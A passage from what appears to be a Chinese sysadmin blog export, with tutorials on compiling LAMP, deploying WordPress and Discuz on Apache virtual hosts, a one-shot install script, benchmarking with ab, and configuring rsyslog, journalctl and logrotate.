/app/httpd24/conf/httpd.conf#取消下面两行的注释LoadModule proxy_module modules/mod_proxy.soLoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so#修改下面行&lt;IfModule dir_module&gt;DirectoryIndex index.php index.html&lt;/IfModule&gt;加下面四行AddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phpsProxyRequests OffProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1 安装wrodpress1234567891011121314]# tar xf wordpress-4.9.4-zh_CN.tar.gz ]# mv wordpress/* /app/httpd24/htdocs/]# cd /app/httpd24/htdocs/]# cp wp-config-sample.php wp-config.php]# vim wp-config.php/** WordPress数据库的名称 */define(&apos;DB_NAME&apos;, &apos;wpdb&apos;);/** MySQL数据库用户名 */define(&apos;DB_USER&apos;, &apos;wpuser&apos;);/** MySQL数据库密码 */define(&apos;DB_PASSWORD&apos;, &apos;centos&apos;);/** MySQL主机 */define(&apos;DB_HOST&apos;, &apos;192.168.1.8&apos;); ab压力测试12345678910111213141516171819202122232425262728293031323334353637]# ab -c 10 -n 100 http://192.168.1.8/This is ApacheBench, Version 2.3 &lt;$Revision: 1826891 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking 192.168.1.8 (be patient).....doneServer Software: Apache/2.4.33Server Hostname: 192.168.1.8Server Port: 80Document Path: /Document Length: 52796 bytesConcurrency Level: 10Time taken for tests: 6.137 secondsComplete requests: 100Failed requests: 0Total transferred: 5304400 bytesHTML transferred: 5279600 bytesRequests per second: 16.30 [#/sec] (mean)Time per request: 613.674 [ms] (mean)Time per request: 61.367 [ms] (mean, across all concurrent requests)Transfer rate: 844.11 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 0 1.0 0 10Processing: 171 579 106.5 579 772Waiting: 155 567 105.9 564 753Total: 171 579 106.5 579 772Percentage of the requests served within a certain time (ms) 50% 579 66% 624 75% 655 80% 664 90% 702 95% 723 98% 759 99% 772 100% 772 (longest request)You have mail in /var/spool/mail/root 结论：编译安装的php-fpm的php执行速度的确比yum一键安装的速度要块。 安装discuz1234567]# wget http://download.comsenz.com/DiscuzX/3.3/Discuz_X3.3_SC_UTF8.zip]# unzip Discuz_X3.3_SC_UTF8.zip]# cd upload/]# cp -r * /data/www/]# cd /data/www]# setfacl -R -m u:apache:rwx /data/www]# setfacl -R -b /data/www/ #完成discuz设置后取消acl权限。 配置httpd的多虚拟主机在这之前，必须先把主配置文件的/app/httpd24/conf/httpd.conf，，前面配置wordpress时候加的代理去掉，如下 123456789101112131415161718192021222324252627282930313233]# vim /app/httpd24/conf/httpd.confInclude conf/extra/httpd-vhosts.conf #去掉注释。并将这四条注释掉，刚加的#AddType application/x-httpd-php .php#AddType application/x-httpd-php-source .phps#ProxyRequests Off#ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1]# vim /app/httpd24/conf/extra/httpd-vhosts.conf&lt;VirtualHost *:80&gt; DocumentRoot &quot;/app/httpd24/htdocs&quot; ServerName www.blog.com ErrorLog &quot;logs/blog.com.error_log&quot; TransferLog &quot;logs/blog.com-access_log&quot; DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1&lt;directory /app/httpd24/htdocs&gt;require all granted&lt;/directory&gt;&lt;/VirtualHost&gt; &lt;VirtualHost *:80&gt; DocumentRoot &quot;/data/www&quot; ServerName www.bbs.com ErrorLog &quot;logs/bbs.com.error_log&quot; TransferLog &quot;logs/bbs.com-access_log&quot; DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/data/www/$1&lt;directory /data/www&gt;require all granted&lt;/directory&gt;&lt;/VirtualHost&gt;]# apachectl restart 至此，实现了lamp的多虚拟主机的wordpress和discuz的php应用。 一键安装lamp+wordpress+discuz脚本​ 博主无聊花了一个小时，写了一个编译安装lamp+wordpress+discuz的脚本。可以供centos6和centos7试验，已成功，代码如下，喜欢自取。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273]#cat lamp.sh #!/bin/bash##********************************************************************#Author: LouiseHong#QQ: 992165098#Date: 2018-06-03#FileName： lamp.sh#URL: http://fenghong.tech/#Description： The test script#Copyright (C): 2018 All rights reserved#********************************************************************#CentOS release 6.9 (Final)#kenerl 2.6.32-696.el6.x86_64#------------------#soruce #------------------# apr-1.6.3# apr-util-1.6.1# httpd-2.4.33# php-7.1.18# mariadb-10.2.15-linux-x86_64# wordpress-4.9.4-zh_CN# Discuz_X3.3_SC_UTF8function print_info()&#123;echo &apos;##################show_info##############&apos;echo &apos;#Author: LouiseHong # &apos;echo &apos;#QQ: 992165098 # &apos;echo &apos;#Date: 2018-06-03 # &apos;echo &apos;#FileName: lamp.sh # &apos;echo -e &apos;\033[1;31m#URL: http://fenghong.tech/ #\033[0m&apos;echo &apos;######show install version and app#######&apos;echo &apos;# apr-1.6.3 #&apos;echo &apos;# apr-util-1.6.1 #&apos;echo &apos;# httpd-2.4.33 #&apos;echo &apos;# php-7.1.18 #&apos;echo &apos;# mariadb-10.2.15-linux-x86_64 #&apos;echo &apos;# wordpress-4.9.4-zh_CN #&apos;echo &apos;# Discuz_X3.3_SC_UTF8 #&apos;echo &apos;#########################################&apos;echo -e &apos;\033[1;32m#press any key to start..ctrl+C to break#\033[0m&apos;echo &apos;#########################################&apos;&#125;check() &#123;if [ $? -eq 0 ];then echo -e &apos;\033[1;32mOK\033[0m&apos;else echo -e &apos;\033[1;31mError\033[0m&apos; exit fi&#125;#----Dependace Installfunction install_dev() &#123;yum groupinstall &apos;Development Tools&apos; -ycheckyum install pcre-devel apr-devel apr-util-devel openssl-devel -ycheckyum install libxml2-devel bzip2-devel libmcrypt-devel -ycheck&#125;#--------------------#Source Getfunction source_wget() &#123;cd $&#123;dir&#125; [ -f apr-1.6.3.tar.gz ] || wget http://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-1.6.3.tar.gzcheck[ -f apr-util-1.6.1.tar.gz ] || wget http://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-util-1.6.1.tar.gzcheck[ -f httpd-2.4.33.tar.bz2 ] || wget https://archive.apache.org/dist/httpd/httpd-2.4.33.tar.bz2check[ -f php-7.1.18.tar.bz2 ] || wget http://mirrors.sohu.com/php/php-7.1.18.tar.bz2check[ -f wordpress-4.9.4-zh_CN.tar.gz ] || wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gzcheck[ -f Discuz_X3.3_SC_UTF8.zip ]|| wget http://download.comsenz.com/DiscuzX/3.3/Discuz_X3.3_SC_UTF8.zipcheck#[ -f mariadb-10.2.15-linux-x86_64.tar.gz ] || wget https://downloads.mariadb.org/f/mariadb-10.2.15/bintar-linux-x86_64/mariadb-10.2.15-linux-x86_64.tar.gz/from/http%3A//mirrors.tuna.tsinghua.edu.cn/mariadb/?serve [ -f mariadb-10.2.15-linux-x86_64.tar.gz ] || wget ftp://172.20.0.1/pub/Sources/sources/mariadb/mariadb-10.2.15-linux-x86_64.tar.gzcheck&#125;#--------------------#-------Install Httpdfunction install_httpd() &#123;cd $&#123;dir&#125; id apache &amp;&gt; /dev/null || useradd -r -d /app/httpd24 -s /sbin/nologin apachetar xf apr-1.6.3.tar.gz tar xf apr-util-1.6.1.tar.gztar xf httpd-2.4.33.tar.bz2mv apr-1.6.3 httpd-2.4.33/srclib/aprmv apr-util-1.6.1 httpd-2.4.33/srclib/apr-util/cd httpd-2.4.33/./configure --prefix=/app/httpd24 \--enable-so \--enable-ssl \--enable-cgi \--enable-rewrite \--with-zlib \--with-pcre \--with-included-apr \--enable-modules=most \--enable-mpms-shared=all \--with-mpm=preforkcheckmake -j $cpus &amp;&amp; make install check&#125;#-------Install MariaDB function install_mariadb() &#123;cd $&#123;dir&#125; id mysql &amp;&gt; /dev/null || useradd -r -d /app/mysqldb -s /sbin/nologin mysqlmkdir /app/mysqldb -pv &amp;&amp; chown mysql.mysql /app/mysqldb &amp;&amp; chmod 770 /app/mysqldbtar xf mariadb-10.2.15-linux-x86_64.tar.gz -C /usr/localcd /usr/localln -s mariadb-10.2.15-linux-x86_64/ mysql &amp;&amp; chown -R root:mysql /usr/local/mysql/&#125;function install_mariadb_conf() &#123;cd /usr/local/mysql/scripts/mysql_install_db --datadir=/app/mysqldb --user=mysqlcheckcp -f /usr/local/mysql/support-files/my-huge.cnf /etc/my.cnfsed -i &apos;/\[mysqld\]/adatadir=/app/mysqldb&apos; /etc/my.cnf[ -f /etc/init.d/mysqld ] || cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld&#125;#-------Install php function install_php() &#123;cd $&#123;dir&#125; tar xf php-7.1.18.tar.bz2cd php-7.1.18/./configure --prefix=/app/php \--enable-mysqlnd \--with-mysqli=mysqlnd \--with-openssl \--with-pdo-mysql=mysqlnd \--enable-mbstring \--with-freetype-dir \--with-jpeg-dir \--with-png-dir \--with-zlib \--with-libxml-dir=/usr \--enable-xml \--enable-sockets \--enable-fpm \--with-config-file-path=/etc \--with-config-file-scan-dir=/etc/php.d \--enable-maintainer-zts \--disable-fileinfocheckmake -j $cpus &amp;&amp; make installcheck&#125;function install_php_conf() &#123;cd $&#123;dir&#125;/php-7.1.18/cp -f php.ini-production /etc/php.inicp -f sapi/fpm/init.d.php-fpm /etc/init.d/php-fpmchmod +x /etc/init.d/php-fpmcp /app/php/etc/php-fpm.conf.default /app/php/etc/php-fpm.confcp /app/php/etc/php-fpm.d/www.conf.default /app/php/etc/php-fpm.d/www.confsed -i &apos;s/nobody/apache/g&apos; /app/php/etc/php-fpm.d/www.conf&#125;#--------install_wordpressfunction install_wordpress_conf() &#123;cd $&#123;dir&#125; tar xf wordpress-4.9.4-zh_CN.tar.gz checkmv wordpress/* /app/httpd24/htdocs/cd /app/httpd24/htdocs/chown -R apache.apache *cp wp-config-sample.php wp-config.phpsed -i &quot;s/database_name_here/wpdb/&quot; wp-config.phpsed -i &quot;s/username_here/wpuser/&quot; wp-config.phpsed -i &quot;s/password_here/centos/&quot; wp-config.php&#125;function install_discuz_conf() &#123;[ -d /app/www ] || mkdir /app/www -pvcd $&#123;dir&#125; unzip Discuz_X3.3_SC_UTF8.zipcheckcp -r upload/* /app/www/&#125;function install_httpd_conf() &#123;sed -i &apos;$aInclude conf/extra/httpd-test.conf&apos; /app/httpd24/conf/httpd.confsed -i &apos;s/daemon/apache/g&apos; /app/httpd24/conf/httpd.confcat &gt;&gt; /app/httpd24/conf/extra/httpd-test.conf &lt;&lt;-EOFLoadModule proxy_module modules/mod_proxy.soLoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so&lt;VirtualHost *:80&gt; DocumentRoot &quot;/app/httpd24/htdocs&quot; ServerName www.blog.com ErrorLog &quot;logs/blog.com.error_log&quot; TransferLog &quot;logs/blog.com-access_log&quot; DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/\$1&lt;directory /app/httpd24/htdocs&gt;require all granted&lt;/directory&gt;&lt;/VirtualHost&gt; &lt;VirtualHost *:80&gt; DocumentRoot &quot;/app/www&quot; ServerName www.bbs.com ErrorLog &quot;logs/bbs.com.error_log&quot; TransferLog &quot;logs/bbs.com-access_log&quot; DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/app/www/\$1&lt;directory /app/www&gt;require all granted&lt;/directory&gt;&lt;/VirtualHost&gt;EOFchecksed -i &apos;$a/app/httpd24/bin/apachectl start&apos; /etc/rc.d/rc.local&#125;function install_lamp()&#123;[ -d $&#123;dir&#125; ] || mkdir $&#123;dir&#125; -pv &amp;&gt; /dev/nullinstall_devsource_wgetinstall_httpdinstall_mariadb install_mariadb_confinstall_php install_php_confinstall_wordpress_confinstall_discuz_confinstall_httpd_conf/app/httpd24/bin/apachectl restartservice php-fpm restartservice mysqld restart/usr/local/mysql/bin/mysql -e &apos;create database IF NOT EXISTS wpdb&apos;/usr/local/mysql/bin/mysql -e &quot;grant all on wpdb.* to wpuser@&apos;localhost&apos; identified by &apos;centos&apos;&quot;echo &quot;PATH=/app/php/bin:/app/php/sbin:/app/httpd24/bin:/usr/local/mysql/bin:$PATH&quot; &gt; /etc/profile.d/lamp.shchkconfig --add mysqldchkconfig --add php-fpm&#125; test_lamp()&#123;cat &gt;&gt; /app/httpd24/htdocs/test.php &lt;&lt;-EOF&lt;?php\$dsn=&apos;mysql:host=127.0.0.1;dbname=mysql&apos;;\$username=&apos;root&apos;;\$passwd=&apos;&apos;;\$dbh=new PDO(\$dsn,\$username,\$passwd);var_dump(\$dbh);?&gt;EOFcurl 127.0.0.1/test.php |grep -q PDO &amp;&amp; echo -e &quot;\033[32mLAMP Test Completed, Is Working!\033[0m&quot; || echo -e &quot;\033[31mSorry, Test failed, Please check!\033[0m&quot;&#125;cpus=`cat /proc/cpuinfo |grep processor|wc -l`dir=&apos;/app/sours&apos;trap &apos;exit&apos; 2clear print_info 2&gt;&amp;1 | tee -a $&#123;dir&#125;/install.logread -p &apos;&apos; install_lamp 2&gt;&amp;1 | tee -a $&#123;dir&#125;/install.logtest_lamp 运行./lamp完成后，试验端口是否开启。访问http://localhost/ 1234567891011121314AH00558: httpd: Could not reliably determine the server&apos;s fully qualified domain name, using localhost.localdomain. Set the &apos;ServerName&apos; directive globally to suppress this messagehttpd not running, trying to starthttpd not running, trying to startGracefully shutting down php-fpm warning, no pid file found - php-fpm is not running ?Starting php-fpm done ERROR! MariaDB server PID file could not be found!Starting MariaDB180623 20:37:04 mysqld_safe Logging to &apos;/app/mysqldb/localhost.localdomain.err&apos;..180623 20:37:04 mysqld_safe Starting mysqld daemon with databases from /app/mysqldb.. SUCCESS! ]#ss -ntlState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 127.0.0.1:9000 *:* LISTEN 0 80 :::3306 :::* LISTEN 0 128 :::80]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Log]]></title>
    <url>%2FLog.html</url>
    <content type="text"><![CDATA[摘要：日志相关，journalctl，远程日志，基于MySQL的日志，loganalyzer网页展示 日志介绍 日志： 历史事件:时间，地点，人物，事件日志级别：事件的关键性程度，Loglevel 系统日志服务： 123sysklogd :CentOS 5之前版本syslogd: system application 记录应用日志klogd: linux kernel 记录内核日志 事件记录格式：日期时间 主机 进程[pid]: 事件内容 C/S架构：通过TCP或UDP协议的服务完成日志记录传送，将分布在不同主机的日志实现集中管理 udp协议 rsyslog rsyslog特性：CentOS6和7 多线程 UDP, TCP, SSL, TLS, RELP MySQL, PGSQL, Oracle实现日志存储 强大的过滤器，可实现过滤记录日志信息中任意部分 自定义输出格式 ELK：elasticsearch, logstash, kibana 非关系型分布式数据库 基于apache软件基金会jakarta项目组的项目lucene Elasticsearch是个开源分布式搜索引擎 Logstash对日志进行收集、分析，并将其存储供以后使用 kibana 可以提供的日志分析友好的 Web 界面 配置文件/etc/rsyslog.conf，/etc/rsyslog.d/*.conf格式：由三部分组成 MODULES：相关模块配置 GLOBAL DIRECTIVES：全局配置 RULES：日志记录相关的规则配置 配置rsyslog成为日志服务器1234567#### MODULES ##### Provides UDP syslog reception$ModLoad imudp$UDPServerRun 514# Provides TCP syslog reception$ModLoad imtcp$InputTCPServerRun 514 journalctlSystemd 统一管理所有 Unit 的启动日志。带来的好处就是，可以只用journalctl一个命令，查看所有日志（内核日志和应用日志）。日志的配置文件/etc/systemd/journald.conf journalctl用法123456789101112131415161718192021##查看所有日志（默认情况下 ，只保存本次启动的日志）]# journalctl##查看内核日志（不显示应用日志）]# journalctl -k##查看系统本次启动的日志]# journalctl -b]# journalctl -b -0##查看上一次启动的日志（需更改设置）]#journalctl -b -1##查看指定时间的日志]# journalctl --since=&quot;2017-10-30 18:10:30&quot;]# journalctl --since &quot;20 min ago&quot;]# journalctl --since yesterday]# journalctl --since &quot;2017-01-10&quot; --until &quot;2017-01-11 03:00&quot;]# journalctl --since 09:00 --until &quot;1 hour ago&quot;##显示尾部的最新10行日志]# journalctl -n##显示尾部指定行数的日志]# journalctl -n 20##实时滚动显示最新日志]# journalctl -f journalctl日志优先级管理查看指定优先级（及其以上级别）的日志，共有8级 emerg alert crit err warning notice info debug 示例如下：123]# journalctl -p err -b]# 日志默认分页输出，--no-pager 改为正常的标准输出]# journalctl --no-pager journalctl输出的格式12345678910#以JSON格式（单行）输出]# journalctl -b -u nginx.service -o json#以JSON格式（多行）输出，可读性更好]# journalctl -b -u nginx.serviceqq -o json-pretty#显示日志占据的硬盘空间]# journalctl --disk-usage#指定日志文件占据的最大空间]# journalctl --vacuum-size=1G#指定日志文件保存多久]# journalctl --vacuum-time=1years vim /etc/hosts 1234567891011121314(1) 准备MySQL Server(2) 在mysql server上授权rsyslog能连接至当前服务器GRANT ALL ON Syslog.* TO &apos;syslog&apos;@&apos;HOST&apos; IDENTIFIED BY &apos;centos&apos;;FLUSH PRIVILEGES;(3) 在rsyslog服务器上安装mysql模块相关的程序包yum install rsyslog-mysql(4) 为rsyslog创建数据库及表；mysql -uUSERNAME -hHOST -pPASSWORD &lt; /usr/share/doc/rsyslog-7.4.7/mysql-createDB.sql###配置rsyslog将日志保存到mysql中]#vim /etc/rsyslog.conf#### MODULES ####$ModLoad ommysql #### RULES ####*.info;mail.none;authpriv.none;cron.none :ommysql:HOST,Syslog,syslog,centos loganalyzer日志展示软件 1234567891011yum install httpd php php-mysql php-gd]# systemctl restart httpd]# cd /var/www/html]# vim test.php&lt;?php$dsn=&apos;mysql:host=DBhost;dbname=Syslog&apos;;$username=&apos;syslog&apos;;$passwd=&apos;centos&apos;;$dbh=new PDO($dsn,$username,$passwd);var_dump($dbh);?&gt; 安装loganalyzer,并填写安装向导source Type MYSQL Native，注意数据库和上面的一样 12345678]# wget]# tar xf loganalyzer-4.1.6.tar.gz]# cp -r loganalyzer-4.1.6/src /var/www/html/log]# cd /var/www/html]# touch config.php]# chmod 666 config.php###网页向导完成安装之后，回收权限]# chmod 644 config.php Logrotate logrotate 程序是一个日志文件管理工具。用来把旧的日志文件删除，并创建新的日志文件，称为日志转储或滚动。可以根据日志文件的大小，也可以根据其天数来转储，这个过程一般通过 cron 程序来执行 配置文件是 /etc/logrotate.conf 主要参数如下:12345678910111213141516171819202122232425compress #通过gzip 压缩转储以后的日志nocompress #不需要压缩时，用这个参数copytruncate #用于还在打开中的日志文件，把当前日志备份并截断nocopytruncate #备份日志文件但是不截断create mode owner group #转储文件，使用指定的文件模式创建新的日志文件nocreate #不建立新的日志文件delaycompress #和compress一起使用时，转储的日志文件到下一次转储时才压缩nodelaycompress #覆盖 delaycompress 选项，转储并压缩errors address #专储时的错误信息发送到指定的Email 地址ifempty #即使是空文件也转储，是缺省选项。notifempty #如果是空文件的话，不转储mail address #把转储的日志文件发送到指定的E-mail 地址nomail #转储时不发送日志文件olddir directory #转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统noolddir #转储后的日志文件和当前日志文件放在同一个目录下prerotate/endscript #在转储以前需要执行的命令可以放入这个对，这两个关键字必须单独成行postrotate/endscript #在转储以后需要执行的命令可以放入这个对，这两个关键字必须单独成行daily #指定转储周期为每天weekly #指定转储周期为每周monthly #指定转储周期为每月size #大小 指定日志超过多大时，就执行日志转储rotate count #指定日志文件删除之前转储的次数，0 指没有备份，5 指保留5 个备份Missingok #如果日志不存在，提示错误Nomissingok #如果日志不存在，继续下一次日志，不提示错误]]></content>
      <categories>
        <category>internet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LAMP1]]></title>
    <url>%2FLamp.html</url>
    <content type="text"><![CDATA[摘要：lamp简介，快速部署lamp，xcache加速php，php应用phpmyadmin/wordpress/discuz搭建。 LAMPLAM(M)P： linux,apache (httpd), mysql, mariadb,memcached,php, perl, python WEB资源类型： 静态资源：原始形式与响应内容一致，在客户端浏览器执行 123&lt;script type=&quot;test/javescript&quot;&gt;document.write(new date());&lt;/script&gt; 动态资源：原始形式通常为程序文件，需要在服务器端执行之后，将执行结果返回给客户端 123&lt;?phpphpinfo();?&gt; Web相关语言 客户端技术： html，javascript服务器端技术：php, jsp，python，asp httpd：接收用户的web请求；静态资源则直接响应；动态资源为php脚本，对此类资源的请求将交由php来运行 php：运行php程序 MariaDB：数据管理系统 http与php结合的方式CGI/FastCGI 常见的LAMP应用 PhpMyAdmin是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库 WordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可把 WordPress当作一个内容管理系统（CMS）来使用 PHPWind:2003年发布了PHPWind的前身版本ofstar，并发展成为包含BBS、CMS、博客、SNS等一系列程序的通用型建站软件, 于2008年加入阿里巴巴集团 Crossday Discuz! Board（简称 Discuz!）是一套通用的社区论坛软件系统。自2001年6月面世以来，是全球成熟度最高、覆盖率最大的论坛软件系统之一。2010年8月23日，与腾讯达成收购协议 ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。2006年6月，ECShop推出第一个版本1.0 快速部署LAMP默认centos7系统 12345]# yum -y install httpd mariadb-server php php-mysql]# systemctl start httpd]# systemctl start mariadb]# mysql -e &quot;grant all on *.* to test@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;&quot;]# mysql_secure_installation #设置mysql数据库的root密码 使用pdo测试php是否已经链接数据库,网站访问http://localhost/test.php,即可测试是否成功。 12345678910111213141516]# cd /var/www/html]# vim test.php&lt;?phptry &#123;$user=&apos;test&apos;;$pass=&apos;centos&apos;;$dbh = new PDO(&apos;mysql:host=192.168.1.8;dbname=mysql&apos;, $user, $pass);foreach($dbh-&gt;query(&apos;SELECT user,host from user&apos;) as $row) &#123;print_r($row);&#125;$dbh = null;&#125; catch (PDOException $e) &#123;print &quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;;die();&#125;?&gt; wordpress博客搭建​ WordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可把 WordPress当作一个内容管理系统（CMS）来使用. ​ 下载安装wordpress,更改配置文件，网站访文http://localhost/wordpress,进行页面设置。前提：已经搭建好LAMP 12345678910]# wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz]# tar xf wordpress-4.9.4-zh_CN.tar.gz -C /var/www/html/]# cd /var/www/html/wordpress/]# cp wp-config-sample.php wp-config.php]# vim wp-config.phpdefine(&apos;DB_NAME&apos;, &apos;wpdb&apos;);/** MySQL数据库用户名 */define(&apos;DB_USER&apos;, &apos;wpdba&apos;);/** MySQL数据库密码 */define(&apos;DB_PASSWORD&apos;, &apos;centos&apos;); Phpmyadmin搭建​ PhpMyAdmin是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库 下载安装phpadmin,相关的设置和管理需要进入页面http://localhost/。前提：已经搭建好LAMP 12345678]# wget https://files.phpmyadmin.net/phpMyAdmin/4.0.10.20/phpMyAdmin-4.0.10.20-all-languages.tar.gz]# tar xvf phpMyAdmin-4.0.10.20-all-languages.tar.gz -C /var/www/html]# cd /var/www/html/]# mv phpMyAdmin-4.0.10.20-all-languages/ phpadmin]# cd phpadmin]# cp config.sample.inc.php config.inc.php]# yum -y install php-mbstring]# systemctl restart httpd 编译安装xcache加速php php的加速器：基于PHP的特殊扩展机制如opcode缓存扩展也可以将opcode缓存于php的共享内存中，从而可以让同一段代码的后续重复执行时跳过编译阶段以提高性能。这些加速器并非真正提高了opcode的运行速度，而仅是通过分析opcode后并将它们重新排列以达到快速执行的目的。 xache：快速而且稳定的PHP opcode缓存，经过严格测试且被大量用于生产环境。项目地址：http://xcache.lighttpd.net/,收录EPEL源。 123456789101112131415161718192021222324]# wget http://xcache.lighttpd.net/pub/Releases/3.2.0/xcache-3.2.0.tar.gz]# yum install -y &apos;Development Tools&apos;]# yum install -y php-devel]# tar xf xcache-3.2.0.tar.gz]# cd ./xcache-3.2.0/]# phpize]# ./configure --enable-xcache --with-php-config=/usr/bin/php-config]# make -j 4 &amp;&amp; make install #会生成xcache.so文件 ]# ll /usr/lib64/php/modules-rwxr-xr-x. 1 root root 74688 Nov 6 2016 curl.so-rwxr-xr-x. 1 root root 2713376 Nov 6 2016 fileinfo.so-rwxr-xr-x. 1 root root 44688 Nov 6 2016 json.so-rwxr-xr-x. 1 root root 1305792 Nov 6 2016 mbstring.so-rwxr-xr-x. 1 root root 146048 Nov 6 2016 mysqli.so-rwxr-xr-x. 1 root root 57936 Nov 6 2016 mysql.so-rwxr-xr-x. 1 root root 33184 Nov 6 2016 pdo_mysql.so-rwxr-xr-x. 1 root root 116344 Nov 6 2016 pdo.so-rwxr-xr-x. 1 root root 29176 Nov 6 2016 pdo_sqlite.so-rwxr-xr-x. 1 root root 271992 Nov 6 2016 phar.so-rwxr-xr-x. 1 root root 51360 Nov 6 2016 sqlite3.so-rwxr-xr-x. 1 root root 700936 Jun 21 23:37 xcache.so-rwxr-xr-x. 1 root root 58392 Nov 6 2016 zip.so]# cp xcache.ini /etc/php.d/]# systemctl restart httpd 可以测试一下xcache的加速，使用httpd的测压力工具ab进行测试，看看加速情况。 fastcgi模式下的LAMPphp的相关配置 配置文件：/etc/php.ini，/etc/php.d/*.ini Module下，重启Httpd服务FastCGI模式下，重启php-fpm服务 配置文件格式 配置文件格式：[foo]:Section HeaderDirective=value注释符：# 纯粹的注释信息; 用于注释可启动的指令说明：在较新的版本中，已经完全使用”;”进行注释php.ini核心配置的详细说明： http://php.net/manual/zh/ini.core.phpPhp.ini配置选项列表： http://php.net/manual/zh/ini.list.php fcgi服务配置文件：/etc/php-fpm.conf, /etc/php-fpm.d/*.conf 连接池： 12345678pm = static|dynamicstatic：固定数量的子进程；pm.max_childrendynamic：子进程数量以动态模式管理pm.max_childrenpm.start_serverspm.min_spare_serverspm.max_spare_serverspm.max_requests = 500 确保运行php-fpm进程的用户对session目录有读写权限 12mkdir /var/lib/php/sessionchown apache.apache /var/lib/php/session 配置httpd，添加/etc/httpd/conf.d/fcgi.conf配置文件，内容类似 1234567]# vim /etc/httpd/conf.d/fcgi.confDirectoryIndex index.phpProxyRequests OffProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/var/www/html/$1 #注意：在HTTPD服务器上必须启用proxy_fcgi_module模块，充当PHP客户端]# httpd –M |grep fcgi]# cat /etc/httpd/conf.modules.d/00-proxy.conf 基于php-fpm安装lamp 和前面快速lamp的安装基本差不多，： 1]# yum -y install php-fpm php-mysql httpd mariadb-server 配置数据库账户 123]# systemctl start mariadb httpd]# mysql -e &quot;grant all on *.* to test@&apos;192.168.1.%&apos; identified by &apos;centos&apos;&quot;]# mysql -e &apos;flush privileges&apos; 测试php-fpm是否连上数据库，提供以下php页面，访问http://localhost/test.php 123456789101112131415]# vim test.php&lt;?phptry &#123;$user=&apos;test&apos;;$pass=&apos;centos&apos;;$dbh = new PDO(&apos;mysql:host=192.168.1.8;dbname=mysql&apos;, $user, $pass);foreach($dbh-&gt;query(&apos;SELECT user,host from user&apos;) as $row) &#123;print_r($row);&#125;$dbh = null;&#125; catch (PDOException $e) &#123;print &quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;;die();&#125;?&gt; 配置apache服务并支持php-fpm,修改完配置文件记得重启服务。 12345678910111213]# vim /etc/httpd/conf/httpd.confDocumentRoot &quot;/data/www&quot;&lt;Directory &quot;/var/www&quot;&gt; AllowOverride None # Allow open access: Require all granted&lt;/Directory&gt;]# vim /etc/httpd/conf.d/fcgi.confDirectoryIndex index.phpProxyRequests OffProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/data/www/$1]# systemctl restart httpd]# systemctl start php-fpm Discuz论坛部署​ Crossday Discuz! Board（简称 Discuz!）是一套通用的社区论坛软件系统。自2001年6月面世以来，是全球成熟度最高、覆盖率最大的论坛软件系统之一。2010年8月23日，与腾讯达成收购协议。 ​ php常见应用Discuz，wordpress；上面已经实现了wordpress个人博客搭建，PhpMyAdmin的web页面管理数据库，这里介绍Discuz_X-3.3的论坛搭建。 12345678]# wget http://download.comsenz.com/DiscuzX/3.3/Discuz_X3.3_SC_UTF8.zip]# unzip Discuz_X3.3_SC_UTF8.zip]# cd upload/]# cp -r * /data/www/]# cd /data/www]# setfacl -R -m u:apache:rwx /data/www##下面网页配置完成后，记得收回权限，保证安全。]# setfacl -R -b /data/www/ 访问http://localhost/,傻瓜式向导安装，第三步的时候数据库名和自己授权的数据库管理员账户是一致的即可。 到此，基本完成安装。 扩展试验wordpress安全加密场景：访问wp-admin，wp-login时，需要我们管理服务器时，实现自动http跳转https，保证用户安全。 访问blog等静态页面时，使用http协议传输。 前提：搭建好lamp。 证书申请提供脚本生成证书，输入你的网站域名www.example.com,重复输入四次密码 